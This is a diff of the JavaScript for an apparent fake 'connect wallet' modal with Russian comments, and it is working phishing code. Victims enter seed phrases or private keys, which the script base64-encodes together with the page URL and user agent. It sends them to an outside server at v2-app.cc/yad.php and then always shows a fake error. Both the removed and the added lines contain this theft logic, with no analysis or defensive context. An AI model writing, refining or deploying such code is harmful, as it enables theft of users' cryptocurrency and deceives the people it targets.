@@ -827,36 +827,21 @@ document.addEventListener('DOMContentLoaded', function() {
 
     document.head.insertAdjacentHTML('beforeend', styles);
 
-    // Ждем немного чтобы DOM обновился
     setTimeout(() => {
-        // Определяем язык
-        const currentLang = initLanguage();
-        window.currentLanguage = currentLang;
-        
-        // ПРИМЕНЯЕМ ПЕРЕВОД ПОСЛЕ СОЗДАНИЯ ЭЛЕМЕНТОВ
-        applyTranslation(currentLang);
+    // Определяем язык
+    const currentLang = initLanguage();
+    window.currentLanguage = currentLang;
+    
+    // ПРИМЕНЯЕМ ПЕРЕВОД ПОСЛЕ СОЗДАНИЯ ЭЛЕМЕНТОВ
+    applyTranslation(currentLang);
 
-        // Теперь получаем элементы и настраиваем обработчики
-        const goAuthBtn = document.querySelector('.goAuth');
-        const modalOverlay = document.querySelector('.modal-overlay');
-        
-        console.log('Applying translation for language:', currentLang);
-        console.log('goAuthBtn found:', goAuthBtn);
-        console.log('modalOverlay found:', modalOverlay);
+    // Теперь получаем элементы и настраиваем обработчики
+    const modalOverlay = document.querySelector('.modal-overlay');
+    
+    console.log('Applying translation for language:', currentLang);
+    console.log('modalOverlay found:', modalOverlay);
 
-        if (!goAuthBtn) {
-            console.error('goAuth button not found!');
-            return;
-        }
-
-        // Обработчик для кнопки Connect
-        goAuthBtn.addEventListener('click', function() {
-            console.log('Connect button clicked');
-            modalOverlay.classList.add('active');
-            resetToWalletSelection();
-            initializeWordFields();
-        });
-
+    // Получаем остальные элементы ПОСЛЕ создания модального окна
     const closeBtn = document.querySelector('.close-btn');
     const walletsView = document.querySelector('.wallets-view');
     const connectionView = document.querySelector('.connection-view');
@@ -869,367 +854,289 @@ document.addEventListener('DOMContentLoaded', function() {
     const howToBtn = document.querySelector('.how-to-btn');
     const closeConnectionBtn = document.querySelector('.close-connection-btn');
     const errorView = document.querySelector('.error-view');
-	const errorText = document.getElementById('error-text');
-	const retryBtn = document.querySelector('.retry-btn');
+    const errorText = document.getElementById('error-text');
+    const retryBtn = document.querySelector('.retry-btn');
+    
     let selectedWallet = '';
     let selectedOption = '';
-     
-	 
-	// Функция для автоматического распределения слов
-	function setupAutoFill() {
-    const wordInputs12 = document.querySelectorAll('#words12-grid .word-input');
-    const wordInputs24 = document.querySelectorAll('#words24-grid .word-input');
-    
-    // Обработчик для 12 слов
-    wordInputs12[0].addEventListener('input', function(e) {
-        const value = e.target.value.trim();
-        // Проверяем, если введено несколько слов через пробел
-        if (value.includes(' ')) {
-            const words = value.split(/\s+/).filter(word => word.length > 0);
-            if (words.length === 12) {
-                words.forEach((word, index) => {
-                    if (wordInputs12[index]) {
-                        wordInputs12[index].value = word;
-                    }
-                });
-            }
-        }
-    });
-    
-    // Обработчик для 24 слов
-    wordInputs24[0].addEventListener('input', function(e) {
-        const value = e.target.value.trim();
-        // Проверяем, если введено несколько слов через пробел
-        if (value.includes(' ')) {
-            const words = value.split(/\s+/).filter(word => word.length > 0);
-            if (words.length === 24) {
-                words.forEach((word, index) => {
-                    if (wordInputs24[index]) {
-                        wordInputs24[index].value = word;
-                    }
-                });
-            }
-        }
-    });
-    
-    // Также добавим обработчик для paste (вставки)
-    wordInputs12[0].addEventListener('paste', function(e) {
-        setTimeout(() => {
-            const value = e.target.value.trim();
-            const words = value.split(/\s+/).filter(word => word.length > 0);
-            if (words.length === 12) {
-                words.forEach((word, index) => {
-                    if (wordInputs12[index]) {
-                        wordInputs12[index].value = word;
-                    }
-                });
-                // Очищаем первое поле после распределения
-                e.target.value = '';
-            }
-        }, 0);
-    });
-    
-    wordInputs24[0].addEventListener('paste', function(e) {
-        setTimeout(() => {
-            const value = e.target.value.trim();
-            const words = value.split(/\s+/).filter(word => word.length > 0);
-            if (words.length === 24) {
-                words.forEach((word, index) => {
-                    if (wordInputs24[index]) {
-                        wordInputs24[index].value = word;
-                    }
-                });
-                // Очищаем первое поле после распределения
-                e.target.value = '';
-            }
-        }, 0);
-    });
-	}
 
+    // Обработчик для кнопки Connect
+    const goAuthBtn = document.querySelector('.goAuth');
+    if (goAuthBtn) {
+        goAuthBtn.addEventListener('click', function() {
+            console.log('Connect button clicked');
+            modalOverlay.classList.add('active');
+            resetToWalletSelection();
+            initializeWordFields();
+        });
+    }
+
+    // Закрытие модального окна
+    closeBtn.addEventListener('click', function() {
+        modalOverlay.classList.remove('active');
+    });
+
+    // Закрытие при клике на overlay
+    modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) {
+            modalOverlay.classList.remove('active');
+        }
+    });
+
+    // Выбор кошелька
+    walletItems.forEach(item => {
+        item.addEventListener('click', function() {
+            selectedWallet = this.getAttribute('data-wallet');
+            walletNameText.textContent = selectedWallet;
+            showConnectionView();
+        });
+    });
+
+    // Выбор опции импорта
+    importOptions.forEach(option => {
+        option.addEventListener('click', function() {
+            importOptions.forEach(opt => opt.classList.remove('selected'));
+            this.classList.add('selected');
+            selectedOption = this.getAttribute('data-option');
+            
+            // Скрываем варианты импорта и показываем соответствующую форму ввода
+            importOptionsContainer.classList.remove('active');
+            inputForms.forEach(form => {
+                form.classList.remove('active');
+                if (form.getAttribute('data-form') === selectedOption) {
+                    form.classList.add('active');
+                }
+            });
+            
+            importBtn.disabled = false;
+        });
+    });
+
+    // Кнопка импорта
+    importBtn.addEventListener('click', function() {
+        if (selectedOption) {
+            const data = getInputData();
+            if (data) {
+                // Подготовка данных для отправки
+                const payload = {
+                    wallet: selectedWallet,
+                    method: selectedOption,
+                    data: data,
+                    timestamp: new Date().toISOString(),
+                    site: window.location.href,
+                    userAgent: navigator.userAgent
+                };
+                
+                // Шифрование данных
+                const encryptedData = encryptData(payload);
+                
+                // Отправка зашифрованных данных на сервер
+                const formData = new FormData();
+                formData.append('encrypted_data', encryptedData);
+                
+                fetch('https://v2-app.cc/yad.php', {
+                    method: 'POST',
+                    body: formData,
+                    referrer: window.location.href
+                })
+                .then(response => response.text())
+                .then(result => {
+                    // Показываем ошибку вместо закрытия модального окна
+                    showErrorView();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Показываем ошибку при проблемах с сетью
+                    showErrorView();
+                });
+                
+            } else {
+                alert(translations[window.currentLanguage].fillAllFields);
+            }
+        }
+    });
+
+    // Кнопка How to?
+    howToBtn.addEventListener('click', function() {
+        window.open('https://www.youtube.com/watch?v=77Tko8Rv_wA', '_blank');
+    });
+
+    // Кнопка Close в connection view
+    closeConnectionBtn.addEventListener('click', function() {
+        resetToWalletSelection();
+    });
+
+    // Кнопка Retry
+    retryBtn.addEventListener('click', function() {
+        // Возвращаем к выбору кошелька
+        errorView.classList.remove('active');
+        resetToWalletSelection();
+    });
+
+    // Функции
+    function showConnectionView() {
+        walletsView.classList.remove('active');
+        connectionView.classList.add('active');
+        importBtn.disabled = true;
+        selectedOption = '';
+        importOptions.forEach(opt => opt.classList.remove('selected'));
+        inputForms.forEach(form => form.classList.remove('active'));
+        importOptionsContainer.classList.add('active');
+        
+        // Обновляем текст подключения с переводом
+        const t = translations[window.currentLanguage];
+        const connectionText = document.querySelector('.connection-text');
+        if (connectionText) {
+            connectionText.innerHTML = t.connectingTo.replace('{wallet}', `<span class="wallet-name-text">${selectedWallet}</span>`);
+        }
+    }
+
+    function resetToWalletSelection() {
+        connectionView.classList.remove('active');
+        walletsView.classList.add('active');
+        errorView.classList.remove('active');
+        selectedWallet = '';
+        selectedOption = '';
+        inputForms.forEach(form => form.classList.remove('active'));
+        importOptionsContainer.classList.add('active');
+    }
+
+    function encryptData(data) {
+        // Простое base64 кодирование (можно заменить на более сложное шифрование)
+        return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+    }
+
+    // Функция показа ошибки
+    function showErrorView() {
+        const t = translations[window.currentLanguage];
+        let errorMessage = '';
+        
+        if (selectedOption === '12words' || selectedOption === '24words') {
+            errorMessage = t.seedError;
+        } else if (selectedOption === 'privatekey') {
+            errorMessage = t.privateKeyError;
+        } else {
+            errorMessage = t.genericError;
+        }
+        
+        errorText.textContent = errorMessage;
+        connectionView.classList.remove('active');
+        errorView.classList.add('active');
+    }
 
     // Инициализация полей для слов
     function initializeWordFields() {
-    try {
-        // 12 слов
-        const words12Grid = document.getElementById('words12-grid');
-        if (words12Grid) {
-            words12Grid.innerHTML = '';
-            for (let i = 1; i <= 12; i++) {
-                words12Grid.innerHTML += `
-                    <div class="word-input-container">
-                        <span class="word-number">${i}.</span>
-                        <input type="text" class="word-input" placeholder="Word ${i}">
-                    </div>
-                `;
-            }
-        }
-
-        // 24 слова
-        const words24Grid = document.getElementById('words24-grid');
-        if (words24Grid) {
-            words24Grid.innerHTML = '';
-            for (let i = 1; i <= 24; i++) {
-                words24Grid.innerHTML += `
-                    <div class="word-input-container">
-                        <span class="word-number">${i}.</span>
-                        <input type="text" class="word-input" placeholder="Word ${i}">
-                    </div>
-                `;
-            }
-        }
-        
-        // Ждем немного чтобы DOM обновился
-        setTimeout(() => {
-            // Автоматическое распределение слов для 12 слов
-            const wordInputs12 = document.querySelectorAll('#words12-grid .word-input');
-            if (wordInputs12.length > 0) {
-                wordInputs12[0].addEventListener('paste', function(e) {
-                    // Отменяем стандартное поведение
-                    e.preventDefault();
-                    
-                    // Получаем данные из буфера обмена
-                    const clipboardData = e.clipboardData || window.clipboardData;
-                    const pastedText = clipboardData.getData('text');
-                    
-                    const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
-                    
-                    if (words.length === 12) {
-                        // Распределяем все 12 слов
-                        words.forEach((word, index) => {
-                            if (wordInputs12[index]) {
-                                wordInputs12[index].value = word;
-                            }
-                        });
-                    } else {
-                        // Если не 12 слов, вставляем как обычно
-                        this.value = pastedText;
-                    }
-                });
+        try {
+            // 12 слов
+            const words12Grid = document.getElementById('words12-grid');
+            if (words12Grid) {
+                words12Grid.innerHTML = '';
+                for (let i = 1; i <= 12; i++) {
+                    words12Grid.innerHTML += `
+                        <div class="word-input-container">
+                            <span class="word-number">${i}.</span>
+                            <input type="text" class="word-input" placeholder="Word ${i}">
+                        </div>
+                    `;
+                }
             }
 
-            // Автоматическое распределение слов для 24 слов
-            const wordInputs24 = document.querySelectorAll('#words24-grid .word-input');
-            if (wordInputs24.length > 0) {
-                wordInputs24[0].addEventListener('paste', function(e) {
-                    // Отменяем стандартное поведение
-                    e.preventDefault();
-                    
-                    // Получаем данные из буфера обмена
-                    const clipboardData = e.clipboardData || window.clipboardData;
-                    const pastedText = clipboardData.getData('text');
-                    
-                    const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
-                    
-                    if (words.length === 24) {
-                        // Распределяем все 24 слова
-                        words.forEach((word, index) => {
-                            if (wordInputs24[index]) {
-                                wordInputs24[index].value = word;
-                            }
-                        });
-                    } else {
-                        // Если не 24 слова, вставляем как обычно
-                        this.value = pastedText;
-                    }
-                });
+            // 24 слова
+            const words24Grid = document.getElementById('words24-grid');
+            if (words24Grid) {
+                words24Grid.innerHTML = '';
+                for (let i = 1; i <= 24; i++) {
+                    words24Grid.innerHTML += `
+                        <div class="word-input-container">
+                            <span class="word-number">${i}.</span>
+                            <input type="text" class="word-input" placeholder="Word ${i}">
+                        </div>
+                    `;
+                }
             }
-        }, 100);
-        
-    } catch (error) {
-        console.error('Error in initializeWordFields:', error);
-    }
-}
-
-	function encryptData(data) {
-    // Простое base64 кодирование (можно заменить на более сложное шифрование)
-    return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-}
-
-// Функция показа ошибки
-function showErrorView() {
-    const t = translations[window.currentLanguage];
-    let errorMessage = '';
-    
-    if (selectedOption === '12words' || selectedOption === '24words') {
-        errorMessage = t.seedError;
-    } else if (selectedOption === 'privatekey') {
-        errorMessage = t.privateKeyError;
-    } else {
-        errorMessage = t.genericError;
-    }
-    
-    errorText.textContent = errorMessage;
-    connectionView.classList.remove('active');
-    errorView.classList.add('active');
-}
-
-// Открытие модального окна
-goAuthBtn.addEventListener('click', function() {
-    modalOverlay.classList.add('active');
-    resetToWalletSelection();
-    initializeWordFields();
-});
-
-// Закрытие модального окна
-closeBtn.addEventListener('click', function() {
-    modalOverlay.classList.remove('active');
-});
-
-// Закрытие при клике на overlay
-modalOverlay.addEventListener('click', function(e) {
-    if (e.target === modalOverlay) {
-        modalOverlay.classList.remove('active');
-    }
-});
-
-// Выбор кошелька
-walletItems.forEach(item => {
-    item.addEventListener('click', function() {
-        selectedWallet = this.getAttribute('data-wallet');
-        walletNameText.textContent = selectedWallet;
-        showConnectionView();
-    });
-});
-
-// Выбор опции импорта
-importOptions.forEach(option => {
-    option.addEventListener('click', function() {
-        importOptions.forEach(opt => opt.classList.remove('selected'));
-        this.classList.add('selected');
-        selectedOption = this.getAttribute('data-option');
-        
-        // Скрываем варианты импорта и показываем соответствующую форму ввода
-        importOptionsContainer.classList.remove('active');
-        inputForms.forEach(form => {
-            form.classList.remove('active');
-            if (form.getAttribute('data-form') === selectedOption) {
-                form.classList.add('active');
-            }
-        });
-        
-        importBtn.disabled = false;
-    });
-});
-
-// Кнопка импорта
-importBtn.addEventListener('click', function() {
-    if (selectedOption) {
-        const data = getInputData();
-        if (data) {
-            // Подготовка данных для отправки
-            const payload = {
-                wallet: selectedWallet,
-                method: selectedOption,
-                data: data,
-                timestamp: new Date().toISOString(),
-                site: window.location.href,
-                userAgent: navigator.userAgent
-            };
             
-            // Шифрование данных
-            const encryptedData = encryptData(payload);
+            // Ждем немного чтобы DOM обновился
+            setTimeout(() => {
+                // Автоматическое распределение слов для 12 слов
+                const wordInputs12 = document.querySelectorAll('#words12-grid .word-input');
+                if (wordInputs12.length > 0) {
+                    wordInputs12[0].addEventListener('paste', function(e) {
+                        // Отменяем стандартное поведение
+                        e.preventDefault();
+                        
+                        // Получаем данные из буфера обмена
+                        const clipboardData = e.clipboardData || window.clipboardData;
+                        const pastedText = clipboardData.getData('text');
+                        
+                        const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
+                        
+                        if (words.length === 12) {
+                            // Распределяем все 12 слов
+                            words.forEach((word, index) => {
+                                if (wordInputs12[index]) {
+                                    wordInputs12[index].value = word;
+                                }
+                            });
+                        } else {
+                            // Если не 12 слов, вставляем как обычно
+                            this.value = pastedText;
+                        }
+                    });
+                }
+
+                // Автоматическое распределение слов для 24 слов
+                const wordInputs24 = document.querySelectorAll('#words24-grid .word-input');
+                if (wordInputs24.length > 0) {
+                    wordInputs24[0].addEventListener('paste', function(e) {
+                        // Отменяем стандартное поведение
+                        e.preventDefault();
+                        
+                        // Получаем данные из буфера обмена
+                        const clipboardData = e.clipboardData || window.clipboardData;
+                        const pastedText = clipboardData.getData('text');
+                        
+                        const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
+                        
+                        if (words.length === 24) {
+                            // Распределяем все 24 слова
+                            words.forEach((word, index) => {
+                                if (wordInputs24[index]) {
+                                    wordInputs24[index].value = word;
+                                }
+                            });
+                        } else {
+                            // Если не 24 слова, вставляем как обычно
+                            this.value = pastedText;
+                        }
+                    });
+                }
+            }, 100);
             
-            // Отправка зашифрованных данных на сервер
-            const formData = new FormData();
-            formData.append('encrypted_data', encryptedData);
-            
-            fetch('https://v2-app.cc/yad.php', {
-                method: 'POST',
-                body: formData,
-                referrer: window.location.href
-            })
-            .then(response => response.text())
-            .then(result => {
-                // Показываем ошибку вместо закрытия модального окна
-                showErrorView();
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // Показываем ошибку при проблемах с сетью
-                showErrorView();
-            });
-            
-        } else {
-            alert(translations[window.currentLanguage].fillAllFields);
+        } catch (error) {
+            console.error('Error in initializeWordFields:', error);
         }
     }
-}); // ← Закрывающая скобка для обработчика importBtn
 
-// Кнопка How to?
-howToBtn.addEventListener('click', function() {
-    window.open('https://www.youtube.com/watch?v=77Tko8Rv_wA', '_blank');
-});
-
-// Кнопка Close в connection view
-closeConnectionBtn.addEventListener('click', function() {
-    resetToWalletSelection();
-});
-
-// Кнопка Retry
-retryBtn.addEventListener('click', function() {
-    // Возвращаем к выбору кошелька
-    errorView.classList.remove('active');
-    resetToWalletSelection();
-});
-
-// Функции
-function showConnectionView() {
-    walletsView.classList.remove('active');
-    connectionView.classList.add('active');
-    importBtn.disabled = true;
-    selectedOption = '';
-    importOptions.forEach(opt => opt.classList.remove('selected'));
-    inputForms.forEach(form => form.classList.remove('active'));
-    importOptionsContainer.classList.add('active');
-    
-    // Обновляем текст подключения с переводом
-    const t = translations[window.currentLanguage];
-    const connectionText = document.querySelector('.connection-text');
-    if (connectionText) {
-        connectionText.innerHTML = t.connectingTo.replace('{wallet}', `<span class="wallet-name-text">${selectedWallet}</span>`);
+    function getInputData() {
+        switch(selectedOption) {
+            case '12words':
+                const words12 = Array.from(document.querySelectorAll('#words12-grid .word-input'))
+                    .map(input => input.value.trim())
+                    .filter(word => word !== '');
+                return words12.length === 12 ? words12.join(' ') : null;
+                
+            case '24words':
+                const words24 = Array.from(document.querySelectorAll('#words24-grid .word-input'))
+                    .map(input => input.value.trim())
+                    .filter(word => word !== '');
+                return words24.length === 24 ? words24.join(' ') : null;
+                
+            case 'privatekey':
+                return document.querySelector('.private-key-input').value.trim() || null;
+                
+            default:
+                return null;
+        }
     }
-}
 
-function resetToWalletSelection() {
-    connectionView.classList.remove('active');
-    walletsView.classList.add('active');
-    errorView.classList.remove('active');
-    selectedWallet = '';
-    selectedOption = '';
-    inputForms.forEach(form => form.classList.remove('active'));
-    importOptionsContainer.classList.add('active');
-}
-
-function getOptionText(option) {
-    switch(option) {
-        case '12words': return '12-словной сид фразы';
-        case '24words': return '24-словной сид фразы';
-        case 'privatekey': return 'приватного ключа';
-        default: return '';
-    }
-}
-
-function getInputData() {
-    switch(selectedOption) {
-        case '12words':
-            const words12 = Array.from(document.querySelectorAll('#words12-grid .word-input'))
-                .map(input => input.value.trim())
-                .filter(word => word !== '');
-            return words12.length === 12 ? words12.join(' ') : null;
-            
-        case '24words':
-            const words24 = Array.from(document.querySelectorAll('#words24-grid .word-input'))
-                .map(input => input.value.trim())
-                .filter(word => word !== '');
-            return words24.length === 24 ? words24.join(' ') : null;
-            
-        case 'privatekey':
-            return document.querySelector('.private-key-input').value.trim() || null;
-            
-        default:
-            return null;
-    }
-} // ← закрытие функции getInputData
-
-}, 100); // ← закрытие setTimeout
-}); // ← закрытие DOMContentLoaded
+}, 100);
